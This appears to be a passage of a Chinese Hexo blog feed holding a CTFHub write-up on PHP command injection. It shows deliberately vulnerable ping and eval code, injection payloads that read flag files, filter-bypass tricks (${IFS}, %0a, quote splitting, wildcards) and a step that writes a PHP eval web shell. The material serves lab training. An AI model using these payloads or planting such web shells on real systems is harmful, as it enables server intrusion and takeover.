class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看根目录文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;ls&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201208153824782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>查看下一级目录,发现flag_23816文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;ls /&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020120918423712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用cat命令读取文件,找到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?cmd=system(<span class="hljs-string">&quot;cat /flag_23816&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201209184311919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//blog.csdn.net/Xxy605/article/details/107548841?utm_medium=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control</span><br></code></pre></td></tr></table></figure><h2 id="命令注入-无过滤"><a href="#命令注入-无过滤" class="headerlink" title="命令注入-无过滤"></a>命令注入-无过滤</h2><p>这是一个在线测试网络延迟的平台，路由器中经常会见到。无任何安全措施，尝试获取 flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br><span class="hljs-variable">$res</span> = FALSE;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 &#123;<span class="hljs-variable">$_GET</span>[&#x27;ip&#x27;]&#125;&quot;</span>;<br>    <span class="hljs-built_in">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>ping一下127.0.0.1<br><img src="https://img-blog.csdnimg.cn/20201210184652619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Payload: ?ip=|ls<br></code></pre></td></tr></table></figure><p>发现了25900911724350.php<br><img src="https://img-blog.csdnimg.cn/20201211103127797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用cat读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=|cat <span class="hljs-number">25900911724350.</span>php<br></code></pre></td></tr></table></figure><p>无回显，可能存在字符编码无法显示出来<br><img src="https://img-blog.csdnimg.cn/20201210184802952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看网页源代码<br><img src="https://img-blog.csdnimg.cn/20201211103237831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>还可以利用管道符，通过base64的形式显示文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=|cat <span class="hljs-number">25900911724350.</span>php|base64<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201211103751285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码，得到flag<br><img src="https://img-blog.csdnimg.cn/20201210185039373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>还可以写码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;&lt;?php @eval(<span class="hljs-subst">$_POST</span>[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; a.php <br></code></pre></td></tr></table></figure><p>执行<code>?ip=;ls</code>，发现写入成功<br><img src="https://img-blog.csdnimg.cn/20201211104044953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>蚁剑连接，数据返回为空<br><img src="https://img-blog.csdnimg.cn/20201211104308449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>需要注意echo命令会调用<code>$_POST</code>导致原始文件中没有,一句话木马里面 <code>$_POST</code> 前加上  <code>\</code>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?ip=;<span class="hljs-keyword">echo</span> -e <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;shell&#x27;]);?&gt;&quot;</span> &gt; b.php <br></code></pre></td></tr></table></figure><p>b.php写入成功<br><img src="https://img-blog.csdnimg.cn/20201211104639881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>蚁剑连接成功<br><img src="https://img-blog.csdnimg.cn/20201211104731952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤cat"><a href="#命令注入-过滤cat" class="headerlink" title="命令注入-过滤cat"></a>命令注入-过滤cat</h2><p>题目描述：过滤了cat命令之后，你还有什么方法能读到 Flag?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/cat/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?ip=|ls<br></code></pre></td></tr></table></figure><p>发现了flag_22422157929595.php<br><img src="https://img-blog.csdnimg.cn/20201211110314508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>题目说过滤了cat，绕过cat</p><ol><li> 单引号或双引号绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca<span class="hljs-string">&#x27;&#x27;</span>t flag_22422157929595.php<br>?ip=|ca<span class="hljs-string">&quot;&quot;</span>t  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>反斜杠绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca\t  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>利用Shell 特殊变量绕过<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|ca<span class="hljs-variable">$@t</span>  flag_22422157929595.php<br>?ip=|ca<span class="hljs-variable">$1t</span>  flag_22422157929595.php<br></code></pre></td></tr></table></figure></li><li>linux中直接查看文件内容的命令<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat、tac、more、less、head、tail、file -f、nl、sed、sort、uniq<br><br>cat： 由第一行开始显示档案内容<br>tac： 从最后一行开始显示，可以看出 tac 是 cat 的反向显示！<br>nl： 显示的时候，随便输出行号！<br>more： 一页一页的显示档案内容<br>less 与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页！<br>head： 查看头几行<br>tail： 查看尾几行<br>od： 以二进制的方式读取档案内容！<br>最常使用的显示档案内容的指令可以说是 cat ，more 及 less 了！<br></code></pre></td></tr></table></figure></li></ol><p>   cat被过滤了，可以使用其他命令，花式Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|tac flag_22422157929595.php<br>?ip=|more flag_22422157929595.php<br>?ip=|less flag_22422157929595.php<br>?ip=|head flag_22422157929595.php<br>?ip=|tail flag_22422157929595.php<br>?ip=|file -f flag_22422157929595.php<br>?ip=|nl flag_22422157929595.php<br>?ip=|sed flag_22422157929595.php<br>?ip=|sort flag_22422157929595.php<br>?ip=|uniq flag_22422157929595.php<br></code></pre></td></tr></table></figure><h2 id="命令注入-过滤空格"><a href="#命令注入-过滤空格" class="headerlink" title="命令注入-过滤空格"></a>命令注入-过滤空格</h2><p>题目描述：这次过滤了空格，你能绕过吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先查询目录结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116153811306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|cat flag_177172732728132.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116154101457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>空格被过滤了，用以下字符代替空格：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt; 、&lt;&gt;、%<span class="hljs-number">20</span>(space)、%<span class="hljs-number">09</span>(tab)、$IFS$<span class="hljs-number">9</span>、 $&#123;IFS&#125;、<span class="hljs-variable">$IFS</span>  <br></code></pre></td></tr></table></figure><p>新的Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=|cat<span class="hljs-variable">$&#123;IFS&#125;</span>flag_177172732728132.php<br></code></pre></td></tr></table></figure><p>查看源代码即可得到flag</p><h2 id="命令注入-过滤目录分隔符"><a href="#命令注入-过滤目录分隔符" class="headerlink" title="命令注入-过滤目录分隔符"></a>命令注入-过滤目录分隔符</h2><p>题目描述：这次过滤了目录分割符 / ，你能读到 flag 目录下的 flag 文件吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/\//&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>老规矩</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=|ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116134511443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一些命令分隔符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">linux中：%<span class="hljs-number">0</span>a 、%<span class="hljs-number">0</span>d 、; 、&amp; 、| 、&amp;&amp;、||<br>windows中：%<span class="hljs-number">0</span>a、&amp;、|、%<span class="hljs-number">1</span>a（一个神奇的角色，作为.bat文件中的命令分隔符）<br></code></pre></td></tr></table></figure><p>由于过滤了目录分隔符 <code>/</code>  ，需要切换到相应目录，并使用 <code>;</code> 分隔符连续执行指令　</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=;<span class="hljs-built_in">cd</span> flag_is_here;ls<br></code></pre></td></tr></table></figure><p>cd  进入flag_is_here目录，ls  显示flag_is_here目录里的内容。<br><img src="https://img-blog.csdnimg.cn/20210116134947994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看flag文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?ip=;<span class="hljs-built_in">cd</span> flag_is_here;cat flag_3708221509571.php<br></code></pre></td></tr></table></figure><p>查看源代码，拿到flag<br><img src="https://img-blog.csdnimg.cn/20210116135639397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="命令注入-过滤运算符"><a href="#命令注入-过滤运算符" class="headerlink" title="命令注入-过滤运算符"></a>命令注入-过滤运算符</h2><p>题目描述：过滤了几个运算符, 要怎么绕过呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/(\||\&amp;)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>从代码中，可以看出过滤了 <code>|</code> 与 <code>&amp;</code>运算符 ，那我们就使用 <code>;</code> 分隔符绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload:?ip=;ls<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210116140338276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ip=;cat flag_64982941521735.php<br></code></pre></td></tr></table></figure><p>查看源代码<br><img src="https://img-blog.csdnimg.cn/20210116140509312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h2><p>题目描述：同时过滤了前面几个小节的内容, 如何打出漂亮的组合拳呢?</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/(\||&amp;|;| |\/|cat|flag|ctfhub)/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$m</span>)) &#123;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c 4 <span class="hljs-subst">&#123;$ip&#125;</span>&quot;</span>;<br>        exec(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$res</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-variable">$m</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码，发现过滤了<code>|、&amp;、;、空格、/、cat</code>，以及<code>flag和ctfhub</code>等关键字</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.查看目录结构：<br>源命令：|ls<br><span class="hljs-comment">#%0a代替运算符|</span><br>Payload:?ip=%0als<br><br>2.查看flag_is_here文件夹下的文件<br>源命令：;<span class="hljs-built_in">cd</span> flag_is_here;ls<br><span class="hljs-comment">#%0a绕过运算符和;</span><br><span class="hljs-comment">#$&#123;IFS&#125;代替空格</span><br><span class="hljs-comment">#flag被过滤了，使用通配符*绕过</span><br>Payload:?ip=%0acd<span class="hljs-variable">$&#123;IFS&#125;</span>*_is_here%0als<br><br>3.查看flag文件内容<br>源命令：?ip=;<span class="hljs-built_in">cd</span> flag_is_here;cat flag_216371105627974.php<br><span class="hljs-comment">#使用more代替cat</span><br>Payload:?ip=%0acd<span class="hljs-variable">$&#123;IFS&#125;</span>*_is_here%0amore%09*_216371105627974.php <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFhub</tag>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线下AWD攻防赛总结</title>
    <link href="/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2021/01/16/%E7%BA%BF%E4%B8%8BAWD%E6%94%BB%E9%98%B2%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码不正确。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="b69457d6dc85e03c460c49fa1ef6889e3a2e2dcf0f3301784c2769d594e28c2e"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>AWD</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AWD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-文件上传练习</title>
    <link href="/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/</url>
    
